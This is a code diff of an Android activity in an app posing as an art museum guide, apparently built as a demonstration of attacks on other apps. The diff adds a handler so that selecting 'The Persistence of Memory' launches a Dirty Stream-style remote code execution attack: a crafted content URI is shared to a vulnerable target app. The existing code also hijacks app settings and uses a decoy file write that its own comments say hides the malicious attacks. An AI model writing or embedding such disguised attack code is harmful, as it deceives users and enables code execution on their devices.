@@ -56,6 +56,9 @@ class MuseumActivity : ComponentActivity() {
             "Girl with a Pearl Earring" -> {
                 hijackVulnerableAppSettings()
             }
+            "The Persistence of Memory" -> {
+                performRceAttack()
+            }
 
             // --- ROW 2 & OTHERS: DECOY FILE WRITE ATTACK ---
             else -> {
@@ -64,6 +67,27 @@ class MuseumActivity : ComponentActivity() {
                 // seem functional and hides the more malicious attacks.
                 performOriginalFileWrite(artwork)
             }
+        }
+    }
+
+    /** Row 4: Persistence of Memory does RCE attack
+     *
+     */
+    private fun performRceAttack() {
+        try {
+            Log.d(TAG, "🔥 Initiating RCE attack...")
+            val maliciousUri = Uri.parse("content://com.artexplorer.museum.rceprovider/rce")
+
+            val attackIntent = Intent(Intent.ACTION_SEND).apply {
+                component = ComponentName("com.example.dirtystream", "com.example.dirtystream.MainActivity")
+                putExtra(Intent.EXTRA_STREAM, maliciousUri)
+                type = "*/*"
+                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+            }
+            startActivity(attackIntent)
+            Log.d(TAG, "✅ RCE attack launched.")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ RCE attack failed.", e)
         }
     }
 
